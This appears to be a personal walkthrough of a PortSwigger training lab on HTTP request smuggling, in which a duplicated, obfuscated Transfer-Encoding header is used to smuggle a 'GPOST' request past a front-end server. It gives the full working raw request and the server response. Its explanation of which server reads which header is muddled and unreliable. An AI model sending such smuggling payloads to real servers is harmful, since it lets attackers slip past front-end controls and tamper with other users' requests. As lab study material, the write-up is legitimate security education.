
# #PortSwigger 



![[Pasted image 20251218005648.png]]


## Lab Description

> This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren't using the GET or POST method.
> 
> **Objective:** Smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.

---
---

## Step 1: Understanding the Vulnerability

**The TE header obfuscation technique:**
- The front-end and back-end servers handle duplicate headers differently
- By adding a duplicate `Transfer-Encoding` header with an obfuscated value (`cow`), we can confuse the front-end
- The front-end may ignore the malformed header, while the back-end processes the valid one

**The attack:**
1. Send a request with two `Transfer-Encoding` headers
2. One valid (`chunked`), one obfuscated (`cow`)
3. Front-end sees the obfuscated header and ignores chunked encoding
4. Back-end sees the valid `chunked` header and processes chunked encoding
5. This creates a smuggling opportunity

Capture the GET request
![[Pasted image 20251218010357.png]]


---

## Step 2: Important Preparation

**Ensure "Update Content-Length" is unchecked:**
1. Go to **Repeater** menu
2. Uncheck **"Update Content-Length"**

**Switch protocol to HTTP/1:**
1. In Repeater, go to **Inspector** panel
2. Under **Request attributes**, change **Protocol** from `HTTP/2` to `HTTP/1`

---

## Step 3: The Smuggling Payload

### Step 3.1: Send the Following Request Twice

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

![[Pasted image 20251218010752.png]]


![[Pasted image 20251218011541.png]]

**Important:** Include the trailing `\r\n\r\n` after the final `0`.

---

## Step 4: Request Breakdown

### Headers Section

|Header|Value|Purpose|
|---|---|---|
|`Transfer-Encoding`|`chunked`|Valid TE header|
|`Transfer-encoding`|`cow`|Obfuscated (case variation)|

### How Servers Interpret

|Server|Behavior|Sees|
|---|---|---|
|Front-end|May ignore malformed TE header|Uses `Content-Length: 4`|
|Back-end|Accepts valid `Transfer-Encoding: chunked`|Processes chunked encoding|

**From your screenshot:**
```
Transfer-Encoding: chunked
Transfer-encoding: cow
```

### The Smuggled Request

The chunk size `5c` (hex) = 92 bytes, containing:
```
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
```


---

## Step 5: Why This Works

**TE header obfuscation:**
- Front-end sees `Transfer-encoding: cow` (invalid) and falls back to `Content-Length`
- Back-end sees `Transfer-Encoding: chunked` (valid) and processes chunks
- The mismatch creates a smuggling opportunity

**The result:**
- The back-end processes the smuggled `GPOST /` request
- The next request's method becomes `GPOST`    

---

## Step 6: Differential Response

**From your screenshot:**
```
HTTP/1.1 403 Forbidden
Content-Length: 27

"Unrecognized method GPOST"
```
- *The method `GPOST` was successfully smuggled!*


---

## Step 7: Lab Solved

Success message displayed:

![[Pasted image 20251218011552.png]]

---
---
